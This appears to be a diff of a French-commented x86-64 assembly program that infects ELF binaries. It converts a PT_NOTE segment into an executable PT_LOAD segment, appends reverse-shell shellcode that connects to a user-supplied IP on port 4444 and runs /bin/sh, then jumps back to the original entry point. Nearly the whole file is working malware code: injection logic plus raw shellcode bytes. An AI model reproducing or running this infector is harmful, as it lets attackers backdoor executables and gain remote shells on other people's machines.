@@ -2,7 +2,6 @@ section .data
     msg_error db "Erreur lors du programme !!!!!!!!!!!", 0xa
     msg_error_len equ $ - msg_error
 
-
     msg_ip db "[x] - Veuillez définir l'ip sur laquel le reverse shell pointera : ", 0xa, "[x] -> "
     msg_ip_len equ $ - msg_ip
 
@@ -15,29 +14,26 @@ section .data
 
     tp_load db 0x01
     droit_write_exe db 0x05
-
     exagereted dq 0xc000000
-
     p_align db 0x00, 0x10, 0x00
+    taille_exagereted dq 0x1000
+
+
 
     reverse_shell_1 db 0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x55, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0xC7, 0xC0, 0x29, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC7, 0x02, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC6, 0x01, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC2, 0x06, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x50, 0x48, 0xB9, 0x02, 0x00, 0x11, 0x5C,
     reverse_shell_1_len equ $ - reverse_shell_1
 
-    ;ip dynamique mais pas le port ( flemme de devoir gérer la taille du port) -- port acutel static :  4444
-
+    ;ip_reverse_shell db 0x7f, 0x00, 0x00, 0x01
+    ;ip_reverse_shell_len equ $ - ip_reverse_shell
+    ;ip dynamique mais pas le port ( flemme de devoir gérer la taille du port) -- port acutel static :  4444 soit  0x11, 0x5C,
     reverse_shell_2 db 0x51, 0x48, 0x89, 0xE6, 0x48, 0xC7, 0xC7, 0x03, 0x00, 0x00, 0x00, 0x6A, 0x10, 0x5A, 0x6A, 0x2A, 0x58, 0x0F, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x54, 0x58, 0x48, 0xC7, 0xC0, 0x21, 0x00, 0x00, 0x00, 0x5F, 0x57, 0x48, 0xC7, 0xC6, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x48, 0xC7, 0xC0, 0x21, 0x00, 0x00, 0x00, 0x5F, 0x57, 0x48, 0xC7, 0xC6, 0x01, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x48, 0xC7, 0xC0, 0x21, 0x00, 0x00, 0x00, 0x5F, 0x57, 0x48, 0xC7, 0xC6, 0x02, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x48, 0xBB, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00, 0x53, 0x48, 0xC7, 0xC0, 0x3B, 0x00, 0x00, 0x00, 0x48, 0x89, 0xE7, 0x48, 0x31, 0xF6, 0x48, 0x31, 0xD2, 0x0F, 0x05, 0x58, 0x58, 0x48, 0x31, 0xC0, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5D, 0x5F, 0x5E, 0x5A, 0x59, 0x5B, 0x58
     reverse_shell_2_len equ $ - reverse_shell_2
     
 
-    taille_exagereted dq 0x1000
-
-    ;jump_insctruction db 0x48, 0xb8, 0x40, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0
+    
     jump_insctruction db 0x48, 0xb8
-    ;ajout de l'old entry point
     jump db 0x00,0x00,0x00,0x00, 0xff, 0xe0
     jump_len  equ $ - jump
-
-     
 
 
 section .bss
@@ -61,7 +57,7 @@ section .bss
 
     ip_arg resq 4
 
-    ip_result resb 4
+    ip_result resq 1
 
 
 section .text
@@ -104,7 +100,7 @@ _start:
 
 
     mov rsi, 0                  ; Index
-    mov rdi, ip_result         
+    mov rdi, ip_result -4        
     mov rcx, 4                  ; Nombre d'octets
     mov rdx, 0                  
 
@@ -136,11 +132,7 @@ store_last_octet:
 fin_parsing:
 
 
-
     xor rax,rax
-    ; recuperation de l'argument 2
-    pop rax
-    mov [port_rev], rax
 
     ; Ouverture du fichier en lecture ecriture 
     mov rax, 2
@@ -152,10 +144,8 @@ fin_parsing:
     test rax, rax 
     js error
 
-
     ; Sauvegarde du descripteur de fichier
     mov [file_descriptor], rax
-
 
 
     ; Lecture du fichier
@@ -173,12 +163,13 @@ fin_parsing:
     mov rdx, msg_lancement_len
     syscall 
 
+
+
     ;init
     xor r15, r15
     xor r9, r9
     mov r9, buffer
     xor rcx, rcx
-
 
 
 ;========= taille du fichier =========
@@ -206,8 +197,6 @@ fin_parsing:
     mov rsi,0
     mov rdx,0
     syscall
-
-
 
 ;========= Trouver segment NOTE  ========= 
 
@@ -245,17 +234,12 @@ mov r15, buffer
     add rax, [file_size]
     mov [new_vaddr], rax
 
- 
 
     modification_file:
-
-
     xor rax,rax
-
-    mov rdi, [file_descriptor] ; meme premier arg pour toutes les autres fonctions
+    mov rdi, [file_descriptor] ; meme premier arg pour toutes les autres fonctions , economise 20 lignes
 
 ;=============== Get old entry point =================
-
     mov rax, 8          ; lseek curseur
     mov rsi, 0x18     ; offset jusqu'au entry point
     mov rdx, 0          
@@ -288,9 +272,7 @@ mov r15, buffer
     mov rdx, 1 
     syscall    
 
-    
 ; =============== Changement droit  =================
-
     mov rax, 8          
     mov rsi, [offset_tp]  
     add rsi , 4    ; Droit 
@@ -302,9 +284,7 @@ mov r15, buffer
     mov rdx, 1 
     syscall             
 
-
 ; =============== Address offset  =================
-
     mov rax, 8          
     mov rsi, [offset_tp]  
     add rsi , 8   ; offset
@@ -316,10 +296,7 @@ mov r15, buffer
     mov rdx, 3 
     syscall         
 
-
-
 ; =============== Virtual address  =================
-
     mov rax, 8          
     mov rsi, [offset_tp]  
     add rsi , 16   ; vaddr
@@ -331,9 +308,7 @@ mov r15, buffer
     mov rdx, 4 
     syscall       
 
-
 ; =============== Taille to exe  filesiz =================
-   
     mov rax, 8         
     mov rsi, [offset_tp]  
     add rsi , 32   ; taille a lire file
@@ -345,10 +320,7 @@ mov r15, buffer
     mov rdx, 3 
     syscall          
 
-
-
 ; =============== Taille to exe memsiz =================
-   
     mov rax, 8         
     mov rsi, [offset_tp]  
     add rsi , 40  ; taille a lire mem
@@ -360,9 +332,7 @@ mov r15, buffer
     mov rdx, 3 
     syscall         
 
-
 ; =============== p align =================
-  
     mov rax, 8        
     mov rsi, [offset_tp]  
     add rsi , 48  ; alignement
@@ -375,7 +345,6 @@ mov r15, buffer
     syscall         
 
 ; =============== Ajout shell code  part 1 =================
-
     mov rax, 8          
     mov rsi, 0 
     mov rdx, 2        ; fin du fichier 
@@ -386,23 +355,18 @@ mov r15, buffer
     mov rdx, reverse_shell_1_len
     syscall      
 
-
     ; =============== Ajout IP shell code =================
-
     mov rax, 8          
     mov rsi, 0 
     mov rdx, 2        ; fin du fichier 
     syscall  
 
     mov rax, 1         
-    mov rsi, ip_result 
+    mov rsi, ip_result
     mov rdx, 4
     syscall      
 
-
-
 ; =============== Ajout shell code  part 2 =================
-
     mov rax, 8          
     mov rsi, 0 
     mov rdx, 2        ; fin du fichier 
@@ -413,10 +377,8 @@ mov r15, buffer
     mov rdx, reverse_shell_2_len
     syscall      
 
-
 ;=============================================================
 ; =============== Ajout instruction de saut  =================
-
     mov rax, 8          
     mov rsi, 0 
     mov rdx, 2        ; fin du fichier 
@@ -427,9 +389,7 @@ mov r15, buffer
     mov rdx, 2
     syscall    
 
-
 ; =============== Ajout offset a sauter  =================
-
     mov rax, 8          
     mov rsi, 0 
     mov rdx, 2        ; fin du fichier 
@@ -440,9 +400,7 @@ mov r15, buffer
     mov rdx, 4     
     syscall
       
-
 ; =============== jump  =================
-
     mov rax, 8          
     mov rsi, 0 
     mov rdx, 2        ; fin du fichier 
@@ -455,7 +413,6 @@ mov r15, buffer
       
 
 sortie:
-
     ;fermeture fichier
     mov rax, 3          
     syscall  
